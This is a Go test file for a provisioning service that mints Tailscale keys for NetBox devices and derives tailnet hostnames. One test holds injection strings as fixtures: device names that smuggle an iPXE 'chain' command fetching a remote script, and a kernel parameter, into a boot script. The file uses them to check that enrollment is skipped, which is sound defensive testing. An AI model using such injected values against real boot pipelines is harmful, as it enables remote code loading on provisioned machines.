package api

import (
	"context"
	"encoding/json"
	"log/slog"
	"testing"

	"github.com/google/uuid"

	"github.com/bluesky-social/slagworks/internal/model"
	"github.com/bluesky-social/slagworks/internal/netbox"
	"github.com/bluesky-social/slagworks/internal/store"
	"github.com/bluesky-social/slagworks/internal/tailscale"
	"github.com/bluesky-social/slagworks/internal/testpg"
)

// recordingMinter is a TailscaleMinter that records each request and
// returns a fixed key.
type recordingMinter struct{ reqs []tailscale.KeyRequest }

func (m *recordingMinter) Mint(_ context.Context, kr tailscale.KeyRequest) (tailscale.MintedKey, error) {
	m.reqs = append(m.reqs, kr)
	return tailscale.MintedKey{Key: "tskey-auth-K9", ID: "k1"}, nil
}

// tailscaleServer builds a Server with a recording minter, a testpg store
// and a NetBox stub holding one device named devName at site pop2, and
// returns it with the id of the machine bound to that device.
func tailscaleServer(t *testing.T, devName string) (*Server, uuid.UUID, *recordingMinter) {
	t.Helper()
	st := store.New(testpg.DB(t, store.Migrate))
	devID := 310
	dev := netbox.Device{
		ID: devID, Name: devName, Serial: "SN-TS",
		Site: &netbox.NestedRef{ID: 2, Name: "pop2", Slug: "pop2"},
	}
	f := &netboxFixture{devices: []netbox.Device{dev}, deviceByID: map[int]netbox.Device{devID: dev}}
	nb := netbox.NewClient(netbox.ClientConfig{BaseURL: f.server(t).URL, Token: "t"})
	id := uuid.New()
	if err := st.CreateMachine(&model.Machine{
		ID: id, NetBoxSerial: "SN-TS", NetBoxDeviceID: &devID, State: model.MachineStateRunning,
	}); err != nil {
		t.Fatalf("seed machine: %v", err)
	}
	m := &recordingMinter{}
	return &Server{store: st, netbox: nb, tailscaleMinter: m, log: slog.Default()}, id, m
}

// TestResolveTailscaleRuntime_ValidName: a device named <short>.<pop> gets a
// key minted for, and stamped with, the tailnet hostname <short>-<pop>.
func TestResolveTailscaleRuntime_ValidName(t *testing.T) {
	s, id, m := tailscaleServer(t, "oob-gw-3.pop2")
	var params model.OpParams
	if err := s.resolveTailscaleRuntime(context.Background(), id, &params); err != nil {
		t.Fatalf("resolve: %v", err)
	}
	if len(m.reqs) != 1 {
		t.Fatalf("expected one mint, got %d", len(m.reqs))
	}
	ts := params.TailscaleRuntime
	if ts == nil || ts.AuthKey != "tskey-auth-K9" || ts.Hostname != "oob-gw-3-pop2" {
		t.Errorf("tailscale_runtime = %+v, want key tskey-auth-K9, hostname oob-gw-3-pop2", ts)
	}
}

// TestResolveTailscaleRuntime_NameNotAHostname: NetBox stores a device name
// as free text. A name that does not give a valid tailnet hostname (here a
// newline that would add an iPXE command to the deploy boot script, or a
// space that would add kernel parameters) skips enrollment: no key is
// minted and the op carries no tailscale_runtime block.
func TestResolveTailscaleRuntime_NameNotAHostname(t *testing.T) {
	for _, name := range []string{
		"web1\nchain http://203.0.113.9/x.ipxe",
		"web1 break x.pop2",
	} {
		s, id, m := tailscaleServer(t, name)
		var params model.OpParams
		if err := s.resolveTailscaleRuntime(context.Background(), id, &params); err != nil {
			t.Fatalf("device %q: resolve: %v", name, err)
		}
		if len(m.reqs) != 0 {
			t.Errorf("device %q: expected no mint, got %+v", name, m.reqs)
		}
		if params.TailscaleRuntime != nil {
			t.Errorf("device %q: expected no tailscale_runtime, got %+v", name, params.TailscaleRuntime)
		}
	}
}

// TestTailnetHostname covers the <short>-<pop> derivation that must match
// ansible's tailscale_hostname (group_vars/all) so a re-deploy reuses the
// MagicDNS name instead of spawning a duplicate node.
func TestTailnetHostname(t *testing.T) {
	cases := []struct {
		devName string
		pop     string
		want    string
	}{
		// NetBox names these hosts <short>.<pop>; strip the .pop suffix.
		{"oob-gw-3.pop2", "pop2", "oob-gw-3-pop2"},
		{"kworker-l34-1.pop1", "pop1", "kworker-l34-1-pop1"},
		// No .pop suffix on the name: use it as the short part as-is.
		{"oob-gw-3", "pop2", "oob-gw-3-pop2"},
		// Suffix only matches the exact ".<pop>" tail, not a mid-name match.
		{"pop2-thing.pop2", "pop2", "pop2-thing-pop2"},
	}
	for _, c := range cases {
		if got := tailnetHostname(c.devName, c.pop); got != c.want {
			t.Errorf("tailnetHostname(%q, %q) = %q, want %q", c.devName, c.pop, got, c.want)
		}
	}
}

// TestTailscaleRuntime_ComposesWithSiblings: an OpParams carrying deploy
// flags + a bmc_runtime block gains tailscale_runtime alongside — the
// blocks compose in one struct, and the marshalled wire shape carries
// every key. This is the shape resolveTailscaleRuntime produces when it
// stamps params.TailscaleRuntime after the BMC resolver ran.
func TestTailscaleRuntime_ComposesWithSiblings(t *testing.T) {
	params := model.OpParams{
		Destructive:      true,
		BMCRuntime:       &model.BMCRuntime{Username: "u", ExtraConfig: map[string]any{}},
		TailscaleRuntime: &model.TailscaleRuntime{AuthKey: "tskey-xyz", Hostname: "h", Tags: []string{"tag:pop1"}},
	}
	raw, err := json.Marshal(params)
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var obj map[string]json.RawMessage
	if err := json.Unmarshal(raw, &obj); err != nil {
		t.Fatalf("marshalled not an object: %v", err)
	}
	for _, k := range []string{"destructive", "bmc_runtime", "tailscale_runtime"} {
		if _, ok := obj[k]; !ok {
			t.Errorf("marshalled params dropped %q: %s", k, raw)
		}
	}
	// Spot-check the tailscale block round-trips the key.
	var got model.TailscaleRuntime
	if err := json.Unmarshal(obj["tailscale_runtime"], &got); err != nil {
		t.Fatalf("tailscale_runtime decode: %v", err)
	}
	if got.AuthKey != "tskey-xyz" || got.Hostname != "h" {
		t.Errorf("tailscale_runtime = %+v, want key=tskey-xyz host=h", got)
	}
}

// TestTailscaleRuntime_AbsentOmitsKey: an OpParams with no tailscale
// enrollment (nil pointer) omits the tailscale_runtime key entirely, so
// the boot handler's absent-block => skip-enrollment path holds.
func TestTailscaleRuntime_AbsentOmitsKey(t *testing.T) {
	raw, err := json.Marshal(model.OpParams{Destructive: true})
	if err != nil {
		t.Fatalf("marshal: %v", err)
	}
	var obj map[string]json.RawMessage
	if err := json.Unmarshal(raw, &obj); err != nil {
		t.Fatal(err)
	}
	if _, ok := obj["tailscale_runtime"]; ok {
		t.Errorf("absent tailscale enrollment should omit the key: %s", raw)
	}
}
